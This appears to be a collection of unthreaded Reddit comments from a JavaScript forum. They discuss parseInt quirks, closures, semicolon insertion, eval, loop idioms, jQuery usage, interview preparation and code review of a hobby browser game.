I'm still a novice JavaScripter, but I've found [JavaScript Garden](http://bonsaiden.github.com/JavaScript-Garden/) extremely helpful in understanding the quirks and nuances of the language. [Essential JavaScript Design Patterns](http://addyosmani.com/resources/essentialjsdesignpatterns/book/) has also been a life saver for me. I know these aren't super "advanced," but I hope they help! Good luck! edit: I like this as well, and it's by the creator of jQuery - http://ejohn.org/apps/learn/
This is often used for the basis of a JS question, possibly during interview time: Q: What will parseInt("08") return? A: 0
yea i dont have the book yet :(
I am not a Twitter or Github guy, though I have started putting up scripts on Github, I understand the importance of having something to show off on Github. And thanks for those interview questions cheat sheet. ;-)
I thought the zero might have been acting as a prefix like the 0x. Thanks for a detailed answer. Looks like I really have to learn more low-level programming to better understand high-level languages like JS.
I have spent 10 years in web development, I have been reading about closures since 2007 and till day closures drive me crazy. 
The real problem is how many people treat JavaScript as a simple tool for simple things. Once you start building some big applications those kinds of people don't know how to reuse code &amp; organize code in better manners than global functions. I'm in a "tech lite" city and the majority of developers here wouldn't have the first clue about prototype chains.
I know, I was just referring to how little I knew with javascript
That's your site? That is really amazing. I just read the making-of you wrote about the header. Thanks for putting so much time in writing about things like that.
As a JS newbie, all of these responses give me something to strive for! Glad you asked, kumarldh -- good luck! :3
If you'll be working on a JavaScript chat client, I'd brush up on Web Sockets.
no worries, would love to hear feedback when you get the chance! Seems everyone showed interest when I said I might make it -- then I make it and you're the only one who responds :-\
Be familiar with [JSLint](http://www.jslint.com/)
It's not that much of a red flag. When you finish your programming formation you are suppose to know how to code. I think the problem here is that they are mixing "knowing how to code" and "knowing the project and the environment". It's unrealistic that they expect him to know the project and the environment in which they work in only a month. In the company I am in, I have been working there for almost a year and I'm still learning how everything works. Just to be clear what I mean by environment is everything you use to code (IDE, framework they use like jQuery or ASP.Net).
I think you may have better feedback in another subreddit -- '/r/programming' perhaps? /r/javascript seems to have a sort of culture of Simple JS questions, Node.JS, and Graphic Demos
Well, can't disclose the name for obvious reasons. Here are some details though. The client is already available for most mobile platforms and a windows client. The solution I will be working for is for web browsers making it platform independent. They already have a BOSH/Comet server in place, you can talk to your FB, Gtalk and pingpong chat(not sure what ping pong is). They are using Dojo as of now and I have never ever used Dojo. 
&gt;Imagine how much more readable javascript becomes when you remove all the 'this', 'function', and 'return' keywords and all the braces, semicolons, and many of the parens. I do not understand the problem people have with most of these things(this and occasionally parens being exceptions). My brain is so wired to the patterns I find it difficult to read languages which do not use them. Then again I started with c before moving into c++, ASP/VB, JavaScript, PHP and Java. Maybe had I worked with Python a lot I'd see some advantage, I dunno.
I really don't think that is the best way to handle this situation.
You have to learn JavaScript anyway...
$ is just a character in Javascript, FYI. It doesn't have a special meaning like it does in PHP and other scripting languages. But jQuery does this for shorthand, so you can do: var divs = $('div'); And you will get all the divs returned.
Armchair and theoretical programmers. I wouldn't be too discouraged, there's still a pretty good group on there and I'm pretty sure being a niche application that's primarily javascript based will keep a lot of the high-noses from providing their input.
Got any Websocket tutorials handy? I always look up stuff like this, but nine times out of ten the tutorials/documentation make a lot of assumptions or are just plain not useful. Something practical would be nice.
Interesting example, scoping in JS can confuse :-)
Personally I don't really have a problem with any of it, but the less stuff I have to type that's the machine's business, the more brain power and time I can allocate to the real problem at hand. And when I come back to my code a few months later, less noise helps figure out what i was trying to achieve and why i did it this way. These are some of the reasons I'm much more comfortable coding in ruby than in Java or Javascript. Less noise, more signal in the source.
Learn how following code works, read up on binding and functional application in javascript. var powersOf2 = Array.apply(null, Array(30)).map(Function.call.bind(Number)).map(Math.pow.bind(null, 2)); console.log(powersOf2);
It's just newtonian physics. Each particle will have a position (x, y) and a velocity (dx, dy). The velocity is how far the particle moves in one second. For instance, consider a particle starting at (0, 100) with a velocity of (10, 0). Such a particle would start at the left hand side of the screen (100 pixels from the top), and slowly travel right at 10 pixels per second. The particle emitters continuously create particles at a fixed starting position with some random velocity. Because the particles look like they have the same starting speed, the magnitude of the velocity must be the same. If you recall Pythagoras, this means that dx^2 + dy^2 is equal to some constant. So you have these particles flying out in straight lines at the same speed in random directions. The only part left is the bits that change their direction, and to do that, we must apply a force. Newton worked out that F = ma, or that force is equal to the mass of an object multiplied by its acceleration. The acceleration is just the change in velocity, in the same way that velocity is the change in position. Going back to our first example of the particle moving across the screen, let's say there's a slight force acting on it in the opposite direction of where it's moving, F = (-2, 0). If we say the mass of the particle is 1, then F = 1a, or F = a. So the acceleration of the particle is (-2, 0) per second. So when the particle starts it has (10, 0) velocity, then a second later it has (8, 0) velocity, then (6, 0), and so on. So in programming terms, we'd have a loop that looks something like: loop do particles.each do |particle| particle.acceleration = calculate_force_from_attractors particle.velocity += particle.acceleration particle.position += particle.velocity end end The force in this case looks like gravity, and Newton's theory of gravity says force is: F = G m1 m2 / r^2. The "G" is a small number, the gravitational constant. The "m1" is the mass of the object the particles are being pulled toward (the attractor). "r" is the distance from the attractor. We can combine "G" and "m1" into one value, the strength of the attractor, which we'll call "k". We're assuming "m2" is 1, so that factors that out right away, so: F = k / r^2
This will answer your question (function(){ "use strict"; 011; }())
*Hoisting
Even if you use AJAX and JSON you would still need to use PHP to parse the JSON and input it into the database. You will still need to learn PHP, the only difference will be the user experience as there does not need to be a page redirect after the form submit using AJAX. Look into [jQuery.post()](http://api.jquery.com/jQuery.post/) but I warn you you may have a lot to learn about javascript and jQuery before you get that working but who knows? I would consider just learning how to submit the form in PHP and then moving up to AJAX if you are so inclined as a lot of the stuff you would build would still need to be built in the AJAX approach. Good luck!
Please do
Hi buddy, I was hoping somebody could provide a starting point for you, so I tried to imagine what you could actual accomplish without having to "learn php" or "learn jquery" or something complex like that Since I imagine you just want your form to look nice and be seemless, lets start with the fact that you redirect them to a separate page it is completely fine and possible to have that form redirect back to itself! you can do a multitude of things to tell the page that "we have some form data" including changing a parameter in the url such as ?form=true or ?p=1 or ?submitted or anything the php code that you are using just needs to be modified to take this into consideration... only when we actually get form data do we tell the php script to save that data change this line &lt;form action="contact.php" method="post"&gt; to this &lt;form action="index.php?p=1" method="post"&gt; so now when the user submits the form it goes back to our normal page, except we have this little "p = 1" attribute that we can read form PHP if(isset($_GET['p']) &amp;&amp; $_GET['p'] == "1"){ /* put your original code in here */ } this snipplet just checks to see if we have a "p" in the get, and if that p equals to 1 if this is true, it means somebody submitted data to our form! now onto validation: there are two reasons why you validate - one is the obvious so you dont have bad data being put in with garbage text and other stuff taht you just dont want and the biggest and most important is security! if somebody is allowed to put whatever characters they want into your form, depending on what YOUR CODE does with that information they could be doing things you did not intend! one example is if somebody enters their information - then on the next page you have a "is this information correct?" if your code just presents back to the user whatever they typed in, they could easily put HTML into your form and then get it to display on your page!! this leads to XSS hacks, amongst many other more complicated things like database injections and such. it is POSSIBLE that it's fine to not validate - but since it is so incredibly easy to do this with PHP i suggest you just simply google a few methods on form validation! one hint: client side form validation is not good by itself. people don't have to submit forms with your webpage they can simply send an HTTP request from any means they wish which would bypass any javascript validation you have written the BEST is both client side validation AND server side - but server side alone will stop your hacking problems cheers!
In my experience they are not really practical. I found them tricky to set up and it's difficult to detect on either side if the connection is still active. A lot of stuff you get for free with Ajax (e.g. robust error handling, form serialization, clear request-response pairs) you have to work for with sockets. It's been a while, though, since I last experimented with them. Perhaps things are easier now.
YUI Theater too.
&gt; What's your favorite feature of Internet Explorer? It has a decent icon, I guess. 
Agree. I think it's possible to explain and important to know the difference. 
The point is actually that I'm making an iPad-only web app for a client which will later be wrapped in a "chromeless" browser. This is the only way I'd ever make an iPad-only compatible site.
Thanks davemo for the suggestion. I'll look further into Bootstrap.
In my experience people are dropping progressive and moving toward graceful, especially when many people are developing web applications and not simple sites.
If I see that fucking example one more time. When have you ever in your life wanted to write a `return` statement that way? Don't get me wrong, I'm not actually mad at you. It's just that the FUD surrounding ASI is pretty extreme. Once I switched to ASI-style I never looked back. Use `!function(){}` for void IIFEs, and for every other bit of strange punctuation on a newline -- `[] {} () + - etc.` -- prepend a `;` and feel good about your masterfully targeted use of tokens.
The ease with which it can download Firefox/Chrome. They should really rename it to "Microsoft Firefox Downloader" :D
Comment of the day.
I'll give you my opinion even though you didn't ask for it :) Coffeescript does not improve on any of the important JS flaws but it adds a completely different syntax that will just complicate things when you're trying to debug your code in the browser. Oh and what I consider important JS flaws really amounts to its nature I guess. Because it's weakly typed, because it's dynamic and doesn't have a way to handle dependencies, the available tools fall short of the kind of experience you get with other languages. There's no compilation step so if you make a typo in a variable name, you won't know until you run that code. The dynamic typing could create issues too. The whole makes it really hard to maintain a large project, refactor, etc... Anyways, sorry for the rant.
That's one of the politest descriptions I've ever heard of it. 
Well, it has been said that if you're the smartest person in the room, you're hanging out in the wrong room.
I think I can only explain closures because one of my computer science courses, Program Structures (taught in Lisp), spent about a month on how variable scoping works.
I saw a fella use `void function() { }()` for an IIFE the other day. It was ... disconcerting, but refreshing. He also didn't use a single semi-colon in his code blob.
It's important that you already know what a Flash of Unstyled Content is - and its causes and how to avoid it - becuase when you're working on a project, you're not going to have something pop up and say "this is a FOUC, here http://lmgtfy.com/?q=fuoc ".
If you asked me these questions in an interview I would be very excited to work for your company.
You are violating a commandment of development. &gt; Thy shalt never trust user input.
It's like what they say about Vegas.. Whatever is declared in a function, stays within a function.
[Validation != Sanitisation](/http://imgs.xkcd.com/comics/exploits_of_a_mom.png), don't feel offended. Validation is you have valid inputs but are those inputs sane enough?
I remember a time when your first example was about binding a click event instead of using jQuery. You don't see those any more.
yes but sanitation is part of validation man you don't just strip the input of invalid characters you also restrict it to a "valid" input i'm pretty sure i was vague enough when i said to google how to validate in php. there aren't many ways to confuse it in this context
[spoiler](http://jsfiddle.net/WKrmJ/1/)
Oh yea, The Furman University Outdoor Club (FUOC) is pretty much what is sounds like-- the club that does stuff outside.
I've found the exact same thing in my area. Front end dev seems to have little respect among employers still, which is unfortunate, because the front end tool box has grown quite a bit larger recently. I did see an offer recently for a JS dev going for $100K. Should have jumped on it.
I disagree 100%. It's an internship. The whole *point* of an internship is to ask questions and learn. Maybe the OP was asking way too many questions, or was asking them in an annoying way or something. But if we take their word for it that they were essentially told not to ask any questions, they should look elsewhere.
If you are not aware of the important topics then you should not applying for any position with the word "lead" in the title. If you were capable of serving as a "lead engineer" then you would know the technology cold so much so that you should have a technical superiority to the interviewer. A decent interview from a moderately competent interviewer will half way discover a pass or fail of your technical superiority within the first 5-10 minutes of the interview.
U understand what you are saying. If you re read the query and my replies to comments you will understand that I am pretty much aware of topics. What I want to know is what I *must* know, for example, I never paid attention to coffeescript but turns out that I *must* know about it now. Did I make myself clear?
Nah, I saw him last year at JS Conf when he was around the guy who wrote Coffeescript. He's a huge fan of some of the syntax sugar you get with it. Or was a year ago. I assume nothing has changed his mind since then.
Note that IE once was a sorta kinda cross-platform browser. Went all the way to IE 5 on unix and OSX. Of course many of the IE idiosyncrasies (starting with active X) never worked on those platforms, and IE OSX was pretty famous for having different ideas on how to render a page from its win32 counterpart, but still.
also do some research to learn how you can support web sockets with different browsers. for example, you can use ajax longpolling, flash, ajax multipart, forever iframe, jsonp polling.
If you have any clue about where the JavaScript development community is at, you'd know a little bit about coffeescript. I'd never hire you, but I do wish you the best with your interview. 
That makes me sad. 
People were scared of an IP? They realize that every website they visit is really just an IP at the end of the day, right?
51
All those numbers, who know what they'll do!
So when you do this: field.onClick = func(stuff); what happens is that you are telling it to call "func" with "stuff" as the parameter right away. When "func" returns, the return value from that function call is assigned to the onClick property. This is a legal thing to do, but it would only make sense if "func" returned another function. when you do this: field.onClick = function () { func(stuff); }; it creates an anonymous function (and doesn't call it) and assigns that to the onClick property. When the onClick fires, it will call the anonymous function.
Indeed, that is extra points. I wouldn't recommend running that code a bunch of times, but it's still nifty and still requires a working understanding of a few key bits of JS to know how it works.
What I don't understand is why parseInt('08',8) returns 0 but parseInt('8',8) returns NaN. Shouldn't both return NaN? Edit: answered [in this comment](http://www.reddit.com/r/javascript/comments/qud7r/what_is_going_on_here_js_leading_zeros/c413tlt) and there's even a more detailed explanation [here](http://www.reddit.com/r/javascript/comments/qud7r/what_is_going_on_here_js_leading_zeros/c419h66).
I know what flash of unstyled content is, but I didn't know people used FOUC as an acronym for it, because that's retarded and not useful. If I got asked that question, I wouldn't know what the interviewer was talking about, even though I fully understant the problem and how to avoid it. you can't just assume that you can make an acroynm out of something and people will immediately guess what it is, even if they know about the actual thing. FTR, I am employed, doing javascript development. Nobody I've talked to here (hundreds of more experienced developers than me) use that acronym.
Couple things: - Wrap your code, right now you're just sticking everything into the global scope. - The code is pretty dense/hard to read. How about some comments/whitespace. You probably want to move it into it's own file as well instead of just putting it inline. - This: var You = false; JavaScript is a dynamically typed language so you can do stuff like this, but it's bad practice. In general you want to initialize a variable with either a sensible default of the type it's going to hold or null to show that it hasn't been filled yet. You want to avoid having a variable that's *sometimes* a boolean and *sometimes* an object unless that really makes sense in context (in this case it doesn't). I'd also note that in JS, *by convention* only constructors start with caps. This is merely a convention, and you are free to break it...but it's worth noting. - This: function Mob (o) { this.Nam = o.Nam; this.Exp = o.Exp; this.CHth = o.Hth; this.MHth = o.Hth; this.Str = o.Str; this.Def = o.Def; this.Agi = o.Agi; this.Lck = o.Lck; this.Des = o.Des; this.Img = o.Img; this.Mon = o.Mon; } As far as I can tell there's no reason to have a mob constructor. You're not using any of the features this allows, so why not just use plain objects? - This: function printCharStats(c,o,m) { // c = character, o = where to print, m = ismob This should really be: function printCharStats( char, where, ismob ) { Don't sacrifice readability for a few keystrokes, and a minifier should handle minifying for you. - This: if(typeof m == "undefined"){ This is really mostly preference, but since "m" is a function argument it will **never** *be* undefined inside that function, it will only **hold the value** "undefined". You can just use: if ( m ) {} And that will cover not only undefined, but null, false, etc. or if ( m == null ) {} will cover only null and undefined. or if ( m == undefined ) {} to just check for the value undefined. typeof foo == "undefined" is useful if a variable may **be** undefined (as opposed to merely holding the value "undefined")... in which case trying to dereference it will case an error. - Your display code is all mixed up with the game logic and *ugly*. Try having the game and display code completely separate. The rendering code should read the current game state and display the necessary stuff based on that. This will make the code cleaner and more flexible. Also, hacking together a bunch of HTML strings is ugly, get some templating or something going on. Hope some of this advice is helpful, good luck with the game and keep up the good work.
After reading SICP, I feel enlightened. Especially the section about [The Environment Model of Evaluation](http://mitpress.mit.edu/sicp/full-text/book/book-Z-H-21.html#%_sec_3.2) made me understand closures. I really suggest to read the whole tome. It's really worth it! While it may not *explicitly* talk about closures. It should make the ideas behind it *much* clearer.
Not sure about the Unix version, but IE/Mac used a completely different engine. I always gathered that it was far more standards-compliant than the Windows version, plus some unique features, but yes, out also had a completely separate bad of rendering bugs. However, the only serious alternative at the time was Netscape, so it was pretty much the best browser out there for a while.
I know this example is just to demonstrate using `call` and `apply` to specify the a function's `this`, but ... $( document ).ready( function() { $( "#register" ).on( "click", function( e ) { conference.register.call( conference, e ); }); }); Isn't this redundant? `conference.register(e)` already has `conference` for its `this`.
to put it in in even more clear terms, s3.onclick = drawX(s3); is setting s3.onclick to null because when invoking drawX(s3), there is nothing being returned. 
The reality of the industry now is that people treat front-end development as a second class citizen. Part of this is the bad reputation that JavaScript has attained by being perceived to be for "hackers" or "designers" only. While this perception is slowly changing the fact remains that one of the best ways to differentiate yourself as a "front-end engineer" is by taking an engineering mindset to solving problems on the front-end. I've spent the last 2 years teaching entrenched server-side (Java) devs how to write maintainable, testable and compatible JavaScript/HTML/CSS and it's been an eye opening and very rewarding experience. After spending some time speaking the "engineering" speak and relating front-end concepts to a server-side devs way of thinking I've had a number of people say things to the effect of "wow, this isn't just some styling or interactivity in the browser, what you're doing is actually engineering". It's key when educating to embrace people where they are at and not stomp all over them for doing things wrong. Small victories are important. I truly believe that if you spend the time to convince people (by showing them) that there is an engineering approach they can take when building front-end code and the tools to support it (JasmineBDD, SASS/Less ~ CSS Preprocessors, Hudson/Jenkins CI Plugins etc..) that the perception will change and salaries will go up for front-end engineers :) Also, I wouldn't consider jobs where the interest was only in "JavaScript"; I'd rather work on the entire stack and work for companies who valued the engineering approach I've described above. In short, strive to be a "full-stack" front-end dev and I think you'll find the right job that pays more. (It doesn't hurt if you can write server-side code either!)
You are right, that would work as well. Also using the ES5 .bind() method will work too, but with limited browser support. My goal was to show off apply &amp; call as you mentioned since many people don't realize those exist, but yes in this case they aren't necessary.
me2. damn you snake.
Awesome post man, thank you very much! 
I don't think it's hard, since it's all luck-based.
I think this is why you should have the javascript be in a separate file and not inline: [This.](http://i.imgur.com/0RfwH.png)
I want to comment on the first one. "Your for loops suck you should be using while(i--)" Actually, I do this *all the time* but not for any 1% improvement in performance. I use while because it is the shortest and most obvious way to make a loop over an array. Compare: var i = 0, length = array.length; for(;i&lt;length;i++) // From zero to max for(i=1;i&lt;length;i++) // From one to max To: var l = array.length; while(l--) // From max to zero while(l--&gt;1) // From max to one Not only is it easier to parse mentally, but traversal from the last to first entry has an additional benefit: I can use Array.splice() to remove entries from the array *easily*.
&gt; var l = array.length; &gt; while(l--) // From max to zero &gt; while(l--&gt;1) // From max to one This notation is great... I'm not a fan of making everything a for loop (because the convention of writing it is just convoluted.) If you view parenthesis as param notation, the (initialize; condition; loop) convention just defies logic. I normally use .forEach() when looping an entire array, but I do like the while(l--&gt;1) because it looks like L to 1.
highly entertaining, keep improving it!
Bug: Die. Press Try again, Keep Character starts with 0 health. Suggestions: Keep the UI tidy with scrolling battle messages set the css style of Area2 to overflow:scroll and set some dimensions relative to the screen. This is currently more of a pit of trials than a dungeon crawl. Consider adding traps and events (good and bad). The quintessential treasure chest (is it booby trapped or not?) would be a leap forward. Finding clear spaces would give the player an opportunity to rest/heal or perform some other action.
&gt; "Eval is evil", or in other words, Eval is too slow and quirky to be considered useful. Isn't it evil because it's susceptible to code injection?
That's the big one, the other one is that the code which LEADS to use of eval is fugly and bad. Once I saw their slide on eval I wondered "What kind of idiots is Google hiring now?" That is a huge failure to understand why eval is evil.
Yes, but eval is also evil because it's not necessary 99/100 times that it's used. Thus, it's practically guaranteed to be computationally inferior to non-eval implementations. Also, this wouldn't be so bad except for the nature of the beast, which is to say that code that is eval'd can be very hard to debug. So, to summarize: * can lead to code injection * slow * hard to debug That earns it a permanent spot on my shit-list. &gt; "If eval is the answer, you're almost certainly asking the wrong question"
Most of the comments here are pointing out that they're missing the point in looking at performance when there are more important things (such as good style). I disagree that they're missing the point. They're not telling you what features you should and shouldn't use, they're just contributing performance data, because sometimes performance comes up in these discussions, and you don't want to base an argument on misinformation. Sure, performance is not the main consideration most of the time, but it does get brought up, and they have a blog link for many of them to prove it. Having accurate performance information can only improve these conversations, don't you think?
Actually what I'm saying is that, according to their tests, === __is__ faster than ==, even though the slide seems to say different.
&gt; it's practically guaranteed to be computationally inferior to non-eval implementations. Why do you feel comfortable making this claim when there are benchmarks proving you wrong? I'm not defending eval, I just think it should be hated on for the right reasons.
Thanks. Yeah, I just put that together a couple of hours ago. Found these pretty interesting video tutorials on Twitter Bootstrap: http://webdesign.tutsplus.com/tutorials/complete-websites/twitter-bootstrap-101-the-grid/
I don't need to be told anymore that eval is bad. I'm tired of people repeating the same mantra about stuff over and over. These things have legitimate uses and and a resourceful programmer will use all the tools at their disposal, ensuring to account for the actual caveats. As an example, there are some situation where generated code hardened into compiled function is the fastest solution, as compared to have large amount of nested scopes to accomplish the same thing.
Be cautious though, if you use the Bootstrap2 option, you're getting all the responsive css that was rolled into the latest Bootstrap release. This can make it a little tricky trying to learn the grid at first. Caught me off guard when I first used it.
I thought that parseInt was the function being called (because of the context) to deal with the string in a similar fashion as when valueOf calls parseInt. Thanks for the explanation on toNumber. What I don't understand is why parseInt('08',8) returns 0 but parseInt('8',8) returns NaN. Shouldn't both return NaN?
I'm calling BS. Where's the link to this alleged proof that I am wrong?
What does “busted” mean in the context of this presentation? I looked at the JSPerf tests for a few of these, and often (e.g. property lookup caching, `void 0` vs. `undefined`) the supposedly-faster version was, in fact, faster. If “busted” means “it’s an optimization, but it’s not worth doing in the vast majority of cases,” that’s way different from “busted, this optimization is no faster or slower than the naive alternative.”
What in the hell kind of benchmark is that? Why is jQuery even involved? Why are you proclaiming I'm "wrong" when just a few slides earlier it stated it was "Plausible/Busted" -- which doesn't seem as definite and conclusive as you're supposing in the first place. Get rid of all that other crap! We're testing eval....not jQuery, not script loading, not HTML insertion....eval. Here, [try this](http://jsperf.com/evalz), which clearly shows that eval is substantially inferior. Of course, any 1st-year CS major should be able to tell you the same thing, and I feel silly having to prove such here. &gt; **Chrome 17** &gt; no eval: 66,555 OPS (operation per second...) &gt; eval: 287 OPS
Am I missing something by thinking that this is the shortest and most obvious way to loop over an array? for (var i in array) I know we're talking about performance here, so I guess if you're dealing with thousands of items or with a game or something you may choose to use a "faster" method, but I often reach for the easiest-to-read solution first, and only optimize if I see a problem. *Ninja edit: After writing this, I went googling to find [this explanation](http://stackoverflow.com/questions/500504/javascript-for-in-with-arrays#answer-4261096), which makes a lot of sense. I've gotten used to Python where it's almost always preferable to do the simpler for..in. But I can see why, as always with JS, there are hidden gotchas in seemingly innocent tasks.
Basically, it just means wrapping your app on a particular variable, making your directory structure a certain way, and making a file that tells package managers what it is. CommonJS is the specification used by NPM, so a lot of people use it. 
Heads up: you have the option of including the responsive CSS in the package if you customize your download.
Same here with "switch" instead of "if / else if" on Chrome. They say switch is faster, my run showed it to be 90% slower. **Edit:** I may have misread the slide.
Thanks for the fun distraction. I created a bot that plays it for me: [Dungeon crawl crawler](https://gist.github.com/2040172) It doesn't access any of the global variables from your game, just does what a human without dev tool access could. Only a little faster (~100fps is perfectly possible on my notebook on chrome) and a little more stupid. You can play with the start values to get different results. For example the lowest combined stats that made it for me (after 30 deaths, one in the city) was 23. Sometimes with low health it may decide to run from every enemy it encounters with the default settings there. Good enough. Edit: Btw, something no one else mentioned: You're using ids multiple times (like #divShowPlayer which is in every area div). ids must be unique.
That wouldn't fix it, the problem is using globals. But you're only "ruining" your own game, so it doesn't really matter.
If you want to know the history of Javascript you are better off watching Douglas Crockford's presentations on YUI theatre or on youtube. He talks a lot about the history of Javascript.
Not THAT much less useful, you can just do for(var i in array) { array[i].doSomething(); }
Yeah, I notice a few slides that claim the opposite of the test results. Pretty unfortunate.
in a for loop you should never make adjustments to the loop, wether looping forward or backward, the while in contrast is different. the lower level (not in javascript afaik) (assembly or jit'd) structures are different.
&gt;Python has something roughly equivalent [to ASI] No, it doesn't. Having no semicolons in first place is very different from inserting semicolons automatically if something didn't work out. It doesn't cause any surprises. &gt;JSLint would flag the hell out of most of those test questions Rightfully so. &gt;So that completely fails to solve the problems posted. How so? It tells you that the code is broken. Given that most people won't get all questions right, yes, it's broken indeed. &gt;Then you've got a case for using manual semicolons. No. Seriously. If there are a pile of corner cases which most people don't get right, you shouldn't use that feature/operator/whatever. If most people don't get it most of the time, that part is broken. It's that simple.
Hey this is excellent! Especially the other article and project it links to. Thanks.
I take it back, I did coincidentally have a good use for it today in making a Bitfield view. Caching the powers of two simplifies the code and probably makes it faster as a side bonus. A for loop would be a bit more efficient, but for a once per run cache of static values, that's not something to spend time worrying on. https://github.com/Benvie/reified/blob/master/lib/bitfield.js
&gt; This still isn't like ASI. It's always clear what happens. Right, I'm saying that ASI as an idea isn't bad _per se_, it just wasn't done right in Javascript. If Javascript had chosen to use the ASI rules from Python, then nobody would have complained about it.
It's the exact same thing by a different name. If you want to be nitpicky about it, let me rephrase: If Javascript's ASI had followed the rules to insert semicolons in the same places as where Python automatically terminates statements, then nobody would have complained about Javascript's ASI.
Context: https://www.destroyallsoftware.com/talks/wat
First of all, I would change: var becomeProgrammer = function( name ){ Into: var becomeProgrammer = function( person ){ Second, I don't know what being a redditor under 101 years old has to do with landing a web development job...
Well, I think you're really reaching. Python and Javascript handle automatic statement termination very similarly in my mind. One does it right and one does it wrong because of the details of the implementation, not because there's something fundamentally different about them. When you talk about what was tacked on to what, I think you're really just looking for some way to claim that they're fundamentally different in order to avoid admitting that ASI is anywhere close to a good feature. So, I think you're wrong. Javascript _could_ have gotten ASI right with just a couple minor details tweaked. But that's just my opinion and there's no reason you have to accept it. Let me just reiterate what I started by saying, that _leaving off semicolons only matters if you're using a linter_. People always forget that part. So you should never say "ASI is confusing, therefore you should use semicolons." Instead you should say "ASI is confusing, therefore you should use semicolons and do static code analysis." The first one is very misleading, because it makes it sound like inserting semicolons manually turns off ASI, and it doesn't.
Are those numbers next to the browser version the number of data points? If so, they seem pretty small. Can we call these numbers representative of their versions (or even the functions in question in some cases) when there could be other factors like the particular machines, their current CPU/memory loads, etc?
&gt; What I don't understand is why parseInt('08',8) returns 0 but parseInt('8',8) returns NaN. Shouldn't both return NaN? The ECMAScript spec defines the behaviour of parseInt. Like similar functions, it uses a specific algorithm or series of steps to arrive at the proper return value. I'm going to paraphrase some of it here. The important thing to consider here is that parseInt is designed to pull numbers from strings that aren't necessarily valid number literals. Consider: parseInt(" 10 little Indians", 10); Which will return 10. So, after the initial setup the next step for parseInt is to basically find the **first and longest** *continuous* substring of the input that contains something that looks like a number. It does this basically by reading each char one at a time. There's a couple of possibilities: 1) the char is on it's "ignore" list (for example, parseInt will ignore initial spaces)...in which case it's just discarded. 2) the char is something that can be part of a number. It is then added to the "number substring" 3) the char is something that can not be part of a number, in which case parseInt stops reading the input string. Whatever is currently in the "number substring" gets passed to the next step, which is basically a similar process to the one I described in my previous post. The important part re. your question is that what constitutes "something that can be part of a number" **depends on the radix**. "8" will never be a part of a number written in base 8, since as far as they are concerned it doesn't exist (just as you will never see 2 in a base 2 or binary number). In the first case, parseInt sees "0" and adds that to it's "number substring". It then hits "8" and says "That's not a valid thing in base 8" and stops. It passes it's "number substring", which at this point is "0" to the next step and gets back 0. In the second one, it hits an invalid char ("8") right away, so it never adds anything to it's "number substring"...an empty string gets passed to the next step and according to the spec that is NaN for these purposes. So basically parseInt('08', 8); is no different than parseInt('0(', 8); as far as parseInt is concerned.
Sort the array descending, use two loops to add the elements together. stop when you find two elements that give you the sum you want or when two elements sum to less than the target. There are probably better ways.. ary = [20,11,10,15,12,5]; function sumSearch(a){ s = a.sort( function order(x,y){return y-x} ); for( i=1;i&lt;s.length;i++) { for( j=i+1;j&lt;s.length;j++) { if( s[i] + s[j] == s[0]) { return true; } if(s[i] + s[j] &lt; s[0]){ return false; } } } return false; } alert(sumSearch(ary));
Well, the part where it tries to extract what it cans was new to me as I never used it like that (doesn't look like a good practice; seems a bit unpredictable). It obviously makes sense then that the name is **parse**Int. Many thanks again for the detailed explanation.
As a matter of fact: http://jsperf.com/jquery-pub-sub
 var data = [20, 21, 19, 67, 234, 78, 98, 112, 67, 122, 56], datatest = function (x) { var big = Math.max.apply(Math, x), a = 0, b = 0, c = x.length; for (a = 0; a &lt; c; a += 1) { for (b = a + 1; b &lt; c; b += 1) { if (x[b] + x[a] === big) { return true; } } } return false; }; datatest(data);
That answers that. Nearly 5 times faster. That's pretty significant.
sorry, I didn't notice it was abandoned.
Web deployments of comic books?
That example isn't about using jquery. It is about variable scoping in closures and knowing how to explicitly force a variable into a new scope. The answer might help you understand. The loop variable will be the ending value in every callback. Rather than referencing the value at the time the async request was made, it references the value at the time the async callback is called.
Haven't looked at the code yet, but given the need for a custom scrollbar, I'm guessing that it won't work with traditional scroll? Why not go the path of custom manipulation on top of a traditional scroll structure, as [The Art of Flight](http://artofflightmovie.com/) has done, for instance?
Is [1, 1, 1, 3] supposed to return true, too?
What really impresses me is how fluid it is. Still trying to figure out how they've done that -- every other page I've seen that is nearly as complex immediately gets bogged down, especially in Firefox. The Art of Flight's page, however, is smooth as butter the whole way through on every reasonably-specced machine. I've been wondering if that has anything to do with their idea of using scroll infrastructure that already exists -- but I can't see how it would. 
b is the index, not another element of the array. This code doesn't actually work.
I'm not sure I trust the test that shows `.indexOf()` to be slower than regex; the code used for the `.indexOf()` case is required to perform string concatenation that the regex cases do not. It is probably best to make a test for the specific case you see in your own code. See for instance: http://jsperf.com/regexp-indexof-perf/7
&gt; That example isn't about using jquery. I know.. I'm talking about before jquery, where you had to do events "manually". Back then $ meant dollars.
awesome! your blog is very very useful to me. i was taught those lessons in scheme at Northeastern university and i've been looking to re-visit it all. putting it into java script was a good choice :)
ExactTarget uses it for all newer projects.
okay - i was just trying to make sure what of the data you were trying to sample. if you do need to take a pixel from each of the images the best way to do this is to store all of that data (your preload) into any type of storage you choose it depends on how big your images are, but i would guess that it's fine to just use normal means like storing the image data returned from getImageData() do it the way another commenter suggested - once you've loaded all the images you'll draw it onto the context, store the image data and then iterate through it when you need the pixel might i suggest that instead of doing it on every mouse move, you simply only do it on mouse down ? or mouse release rather? but thinking back at this - it confuses me greatly why you need to sample all 1000 images - do you intend on displaying a 1000 different pixel values? if you're only sampling one image at any given time then this is very trivial
Yes, the 'sampling' is to generate an array that will populate a second window showing a time-series graph. This is temperature data for whole globe from 1880-present, using the map slider and advancing years and looking at the overall globe can give you one picture, but then if you move the mouse over the map (no longer advancing the slider), you see the temp for ALL the years at THAT spot in the time series graph. 
Try using [.prop()](http://api.jquery.com/prop/) instead of .attr().
like this: http://jsbin.com/uwuqap/edit#html,live
Why was my comment downvoted? From the docs: &gt; The .prop() method should be used to set disabled and checked instead of the .attr() method.
Your statement is right but I think the problem is that jquery isn't included in the page until after the script that uses it is run.
*wrap the whole custom script (just for the op to avoid confusion)
"In production" is kinda ambiguous in this context. Using require.js does not mean that clients download require.js and a dozen tiny files when they take a look at the final product. There is r.js for that. Well, AMD is just one way to handle this kind of thing. Right now it's probably the best option by the looks of it. It handles dependencies, downloads stuff in parallel, it allows you to write your stuff in a very modular fashion, and it works great together with most libraries and frameworks. Additionally, the final packaging/minifying step was already taken care of. That stuff is done, you just have to use it. Anyhow, this is a technical topic. Evaluate the different options and compile a list of pros and cons. Finally, do the math.
So these work, but now the form doesn't submit. It just disables the button and the action (add-charge.php) on the form isn't called.
